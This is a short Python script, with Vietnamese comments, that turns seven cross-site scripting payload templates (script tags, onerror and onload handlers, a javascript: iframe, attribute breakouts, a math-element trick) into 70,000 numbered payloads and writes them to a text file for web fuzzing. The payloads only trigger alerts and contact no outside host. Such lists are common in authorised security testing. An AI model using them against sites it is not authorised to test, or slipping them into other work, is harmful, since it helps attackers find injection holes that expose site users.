# Tạo danh sách các payload XSS dựa trên mẫu, lưu vào file .txt

base_payloads = [
    "<script>alert({})</script>",
    "<img src=x onerror=alert({})>",
    "<svg onload=alert({})>",
    "<iframe src='javascript:alert({})'>",
    "<body onload=alert({})>",
    "'\"><script>alert({})</script>",
    "<math><mtext></mtext><annotation encoding='application/x-xml'>"
    "<script>alert({})</script></annotation></math>"
]

# Giới hạn số lượng payloads để tránh file quá lớn (ví dụ: 10,000 payloads)
max_payloads = 10000

payload_list = []
for i in range(max_payloads):
    for template in base_payloads:
        payload_list.append(template.format(i))

# Ghi vào file
file_path = "/mnt/data/xss_payloads.txt"
with open(file_path, "w", encoding="utf-8") as f:
    f.write("\n".join(payload_list))

file_path
